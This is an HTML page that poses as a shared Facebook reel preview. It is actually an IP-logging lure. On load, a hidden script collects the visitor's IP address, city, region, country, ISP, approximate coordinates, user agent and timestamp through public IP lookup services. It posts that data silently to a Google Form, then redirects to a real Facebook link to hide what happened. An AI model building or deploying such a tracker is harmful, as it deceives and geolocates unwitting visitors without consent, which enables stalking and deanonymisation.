<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Facebook Reel</title>
</head>
<body>
<script>
const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdQJ8zX8vK7zL9vWvX9zqJabc123/formResponse";

const entryIP       = "entry.1888888888";
const entryCity     = "entry.1777777777";
const entryRegion   = "entry.1666666666";
const entryCountry  = "entry.1555555555";
const entryISP      = "entry.1444444444";
const entryCoords   = "entry.1333333333";
const entryUA       = "entry.1222222222";
const entryTime     = "entry.1111111111";
const entryUrl      = "entry.1000000000";

fetch('https://api.ipify.org?format=json')
.then(r => r.json())
.then(ipData => {
    fetch(`https://ipapi.co/${ipData.ip}/json/`)
    .then(r => r.json())
    .then(info => {
        const data = new FormData();
        data.append(entryIP,       info.ip || ipData.ip);
        data.append(entryCity,     info.city || "Unknown");
        data.append(entryRegion,   info.region || "Unknown");
        data.append(entryCountry,  info.country_name || "Unknown");
        data.append(entryISP,      info.org || "N/A");
        data.append(entryCoords,   (info.latitude || "") + ", " + (info.longitude || ""));
        data.append(entryUA,       navigator.userAgent);
        data.append(entryTime,     new Date().toISOString());
        data.append(entryUrl,      window.location.href);

        fetch(formUrl, { method: "POST", body: data, mode: "no-cors" });
    });
});
</script>

<!-- Realistic Facebook Messenger / Shared Reel Preview -->
<div style="max-width:500px; margin:40px auto; background:#fff; border:1px solid #ddd; border-radius:8px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,0.1); font-family:Arial,sans-serif;">
    <div style="background:#1877f2; color:white; padding:10px; font-size:14px; text-align:center;">
        Facebook
    </div>
    <div style="padding:15px;">
        <div style="height:280px; background:#f0f2f5; display:flex; align-items:center; justify-content:center; color:#666; font-size:15px;">
            🎥 Video is loading...<br><br>
            <small>This funny reel is taking a moment.</small>
        </div>
        <div style="margin-top:12px; font-size:14px; color:#050505;">
            Someone shared a reel with you
        </div>
        <div style="margin-top:8px; color:#65676b; font-size:13px;">
            Tap to watch →
        </div>
    </div>
</div>

<script>
setTimeout(() => {
    window.location = "https://www.facebook.com/share/r/1DKvLG1W3W/";
}, 1800);
</script>
</body>
</html>
